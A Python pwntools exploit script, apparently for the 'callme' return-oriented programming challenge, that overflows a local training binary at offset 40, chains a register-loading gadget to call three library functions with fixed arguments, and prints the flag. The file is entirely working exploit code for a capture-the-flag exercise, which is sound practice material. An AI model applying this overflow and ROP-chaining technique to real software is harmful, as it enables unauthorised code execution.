import time

from pwn import *


EXECUTABLE = "./callme"
context.binary = elf = ELF(EXECUTABLE)
lib_callme = ELF("./libcallme.so")


p = process(EXECUTABLE)

OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr)
    log.success(f"Offset found: {offset}")
    exit()


rop = ROP(elf)

payload  = b"A" * OFFSET

# 1. call `callme_one`
# 2. call `callme_two`
# 3. call `callme_three`
#
# All with:
#   + 0xdeadbeefdeadbeef  -> rdi
#   + 0xcafebabecafebabe  -> rsi
#   + 0xd00df00dd00df00d  -> rdx

# Load function arguments
payload += p64(rop.rdi_rsi_rdx.address) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
# Call `callme_one`
payload += p64(elf.plt.callme_one)

payload += p64(rop.rdi_rsi_rdx.address) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
# Call `callme_two`
payload += p64(elf.plt.callme_two)

payload += p64(rop.rdi_rsi_rdx.address) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
# Call `callme_three`
payload += p64(elf.plt.callme_three)


p.sendafter(b"> ", payload)
p.recvline()
p.recvline()
p.recvline()

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
